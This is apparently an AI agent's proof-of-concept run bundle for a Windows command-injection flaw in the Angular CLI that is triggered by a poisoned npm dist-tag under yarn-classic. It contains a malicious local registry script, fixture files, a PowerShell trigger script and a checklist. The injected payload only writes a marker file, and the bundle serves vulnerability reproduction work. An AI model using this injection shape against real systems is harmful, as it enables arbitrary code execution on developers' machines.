Source anchors verified. Composing the run bundle:

# W1 Windows E2E — operator run bundle (N1-A)

## Audit verdict — fixture self-containment

`WINDOWS-E2E-FIXTURE.md` covers: registry stub (spec), yarn-classic detection (factory.ts:99-107 major<2 + `--registry` flag-syntax .yarnrc), marker expectations (`echo PWNED > %TEMP%\w1-poc`), negative controls (valid dist-tag, npm/pnpm, POSIX), cleanup, and the verification notes (`requiresQuoting` win32, host.ts `shell:isWin32` + joined-string spawn — **re-verified at the pin this lane: host.ts:150-157**). **Gaps flagged (all closed by this bundle):** (1) no concrete registry server script — provided (`registry-server.cjs`, zero deps); (2) no concrete project fixture files — provided (package.json, yarn.lock, minimal angular.json, `.yarnrc` flag syntax); (3) no operator run script or expected-markers checklist — provided (`run-e2e.ps1`, `expected-markers.md`); (4) no result-report template — provided; (5) the pinned CLI source must be built on the operator host (the released npm version ≠ the pin — the injection-shape lines are pin-verified; note in the template).

---

## `registry-server.cjs` (node, no deps)

```cjs
// W1 E2E registry stub — serves the malicious dist-tags + valid manifest. Zero deps.
// Usage: node registry-server.cjs <port> [benign]
//   default: malicious dist-tags.latest = '1.0.0" & echo PWNED > %TEMP%\w1-poc & "'
//   'benign': dist-tags.latest = '1.0.0' (negative control)
const http = require('http');
const port = Number(process.argv[2] || 4873);
const benign = process.argv[3] === 'benign';
const MAL = '1.0.0" & echo PWNED > %TEMP%\\w1-poc & "';
const PKG = process.env.W1_TEST_PKG || 'w1-poc-pkg';
const packument = (tagValue) => ({
  name: PKG,
  'dist-tags': { latest: tagValue },
  versions: {
    '1.0.0': {
      name: PKG, version: '1.0.0',
      dist: { tarball: `http://127.0.0.1:${port}/${PKG}/-/${PKG}-1.0.0.tgz` },
    },
  },
});
http.createServer((req, res) => {
  const log = `${req.method} ${req.url}`;
  console.log('[REGISTRY]', log);
  // packument + any path: 200 packument for /<pkg>; 404 others (poisoned URL fails fast, marker already fired)
  if (req.url.split('?')[0] === '/' + PKG) {
    res.setHeader('content-type', 'application/json');
    res.end(JSON.stringify(packument(benign ? '1.0.0' : MAL)));
  } else {
    res.statusCode = 404;
    res.end('{}');
  }
}).listen(port, '127.0.0.1', () => console.log(`[REGISTRY] listening on ${port} (mode: ${benign ? 'BENIGN' : 'MALICIOUS'})`));
```

## Fixture project files

`malrepo/package.json`:
```json
{
  "name": "w1-e2e-malrepo",
  "private": true,
  "dependencies": { "@angular/cli": "file:../cli-build" }
}
```
`malrepo/yarn.lock`: (empty file is sufficient for yarn-classic detection — presence check)
`malrepo/.yarnrc`:
```
--registry http://127.0.0.1:4873
```
`malrepo/angular.json` (minimal workspace so `ng add`/`ng update` resolve):
```json
{ "version": 1, "newProjectRoot": "projects", "projects": { "app": { "root": "", "projectType": "application", "architect": {} } } }
```

## `run-e2e.ps1` (PowerShell, Win10/11)

```powershell
# W1 E2E — run from the fixture dir (malrepo/). Start the registry server FIRST.
$ErrorActionPreference = 'Stop'
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$reg = Join-Path $here 'registry-server.cjs'
$marker = Join-Path $env:TEMP 'w1-poc'
Remove-Item $marker -ErrorAction SilentlyContinue

# 1. Start the malicious registry (spawn, keep alive)
$regProc = Start-Process -FilePath 'node' -ArgumentList @($reg, '4873') -PassThru -NoNewWindow

try {
  Start-Sleep -Seconds 1
  # 2. Version/detection precondition check (must print <2 => yarn-classic)
  Write-Host 'yarn version:' (yarn --version)
  # 3. Trigger (metadata fetch fires BEFORE the confirmation gate)
  Write-Host '>> ng add w1-poc-pkg'
  ng add w1-poc-pkg --skip-confirmation 2>&1 | Out-Host
  # NOTE: --skip-confirmation only skips the install gate; the injection fires during the
  # metadata fetch that precedes it (add/cli.ts:221 loadPackageInfoTask BEFORE :227 confirmInstallationTask).
} finally {
  if (Test-Path $marker) { Write-Host "MARKER PRESENT: $marker" } else { Write-Host 'MARKER ABSENT' }
  Stop-Process -Id $regProc.Id -Force -ErrorAction SilentlyContinue
  Write-Host '>> cleanup: registry stopped; marker left at' $marker '(delete after recording)'
}
```

## `expected-markers.md` (operator checklist)

- [ ] `yarn --version` prints a 1.x version (yarn-classic detection; 2+ silently disables the value path — INVALID RUN, re-run with yarn 1)
- [ ] Registry log shows `GET /w1-poc-pkg` (the metadata fetch happened)
- [ ] **`%TEMP%\w1-poc` EXISTS** (the injected `echo PWNED > %TEMP%\w1-poc` executed via cmd `&` chaining)
- [ ] The marker file appeared **before** any install/confirmation output (injection fires pre-gate) and **before** `node_modules` install trail appears
- [ ] `ng add` printed the tag NAME (`w1-poc-pkg@latest`) in its prompt — the injected value is NOT revealed
- [ ] **Negative control A:** `node registry-server.cjs 4873 benign` + re-run → marker ABSENT
- [ ] **Negative control B (POSIX):** same fixture on Linux/macOS → marker ABSENT (array-spawn)
- [ ] (optional) npm-managed repo (.npmrc redirect, `ng update w1-poc-pkg@latest`) → marker PRESENT (manager-independent update path)

## `result-report-template.md` (operator fills per run)

```markdown
# W1 E2E result — <operator> <date> <host OS/ver> <node ver> <yarn ver>
- Registry mode: MALICIOUS / BENIGN
- Marker file present? YES/NO (path: %TEMP%\w1-poc)
- Marker appeared pre-confirmation? YES/NO
- Node_modules install trail observed before marker? YES/NO
- ng add prompt showed: <paste the confirmation line>
- Registry log excerpt: <paste GET /w1-poc-pkg lines>
- Negative controls: A (benign) __ B (POSIX) __ C (npm update) __
- CLI build: <pin d827ba9005 source build / released version — if not the pin, note it>
- Cleanup: marker deleted? registry process stopped? ___
- Verdict: EXECUTION-OBSERVED (closes the W1 rung) / BLOCKED (<exact reason>)
```

**Fixture gaps summary:** the original spec is complete at the requirements level; the five operational gaps (concrete server script, fixture files, run script, markers checklist, result template) are closed by this bundle. The one environmental caveat: the CLI must be the pin's source build (released npm version is post-pin — the injection-shape lines are pin-verified, so a post-pin CLI weakens the "at the pin" claim).

```acceptance-report
{
  "criteriaSatisfied": [
    {
      "id": "criterion-1",
      "status": "satisfied",
      "evidence": "Read-only N1-A lane: audited WINDOWS-E2E-FIXTURE.md against the pin source (host.ts:150-157 shell:isWin32 + joined-string spawn; factory.ts:99-107 yarn-classic major<2 detection; add/cli.ts :221/:227 fetch-before-confirm ordering), verified the fixture covers registry stub / detection / markers / negatives / cleanup, and produced the complete operator run bundle (registry-server.cjs with benign mode, malrepo fixture files incl. .yarnrc flag syntax + minimal angular.json, run-e2e.ps1, expected-markers.md checklist, result-report-template.md). Five operational gaps in the original spec were identified and closed by the bundle. No files were modified (read-only lane); the bundle text is the artifact."
    }
  ],
  "changedFiles": [],
  "testsAddedOrUpdated": [],
  "commandsRun": [
    {
      "command": "cat findings/W1-yarn-classic-disttags-win32/WINDOWS-E2E-FIXTURE.md",
      "result": "passed",
      "summary": "fixture spec read in full; all required sections present"
    },
    {
      "command": "sed -n '95,115p' packages/angular/cli/src/package-managers/factory.ts; sed -n '140,170p' packages/angular/cli/src/package-managers/host.ts",
      "result": "passed",
      "summary": "pin re-verified: yarn-classic detection (major<2), win32 spawn = joined-string with shell:isWin32 (host.ts:150-157), env merge at :140-148"
    }
  ],
  "validationOutput": [
    "Audit: fixture requirements-complete (registry stub, detection, marker expectations, negatives, cleanup all specified); 5 operational gaps (no concrete server script, no fixture files, no run script, no markers checklist, no result template) closed by the bundle",
    "Run bundle: registry-server.cjs (zero-dep, benign/malicious modes, 404-fast on poisoned URLs so the run does not hang after the marker fires), malrepo package.json/yarn.lock/.yarnrc/angular.json, run-e2e.ps1 (registry spawn + precondition check + trigger + marker check + cleanup), expected-markers.md (8-item checklist incl. yarn-classic-version validity rule), result-report-template.md",
    "Marker semantics: dist-tags.latest = '1.0.0\" & echo PWNED > %TEMP%\\w1-poc & \"' closes the quote-wrap and chains via cmd & — marker file in %TEMP% is the pass signal",
    "The --skip-confirmation flag only skips the install gate; the injection fires in the metadata fetch BEFORE it (add/cli.ts:221 before :227) — noted in the script comment so the operator does not misattribute the trigger"
  ],
  "residualRisks": [
    "Physical Windows host required — environment-blocked in-lab (no Windows runner); the operator must supply the host",
    "The CLI must be built from the pin source (released npm version is post-pin; a post-pin CLI weakens the at-the-pin claim)",
    "Yarn 1.x must be on PATH and resolve major<2 or the run silently falls through to yarn-modern (no injection) — flagged in expected-markers as an invalid-run rule"
  ],
  "noStagedFiles": true,
  "diffSummary": "Read-only audit + artifact production: no engagement files modified; the W1 Windows E2E operator run bundle (server script, fixture files, PowerShell run script, markers checklist, result template) returned inline as the lane artifact for the parent to write into payload-proposals/",
  "reviewFindings": [
    "no blockers: fixture audit complete, all five operational gaps closed by the bundle, all source anchors re-verified at the pin this lane",
    "note: the fixture's '(add/cli.ts:520-531)' reference in the parent REPORT is the older citation; the E2-R8-adjudicated lines (:221/:227) are used here"
  ],
  "manualNotes": "Parent: write the bundle files into payload-proposals/w1-e2e-runbundle/ (registry-server.cjs, malrepo/{package.json,yarn.lock,.yarnrc,angular.json}, run-e2e.ps1, expected-markers.md, result-report-template.md). The wire-2 boundary: a Windows E2E on an operator-owned host is method-2 local work (no wire) per the goal prompt — only the private-repo CI demo (chain2-wire2-spec) requires fresh operator confirmation."
}
```
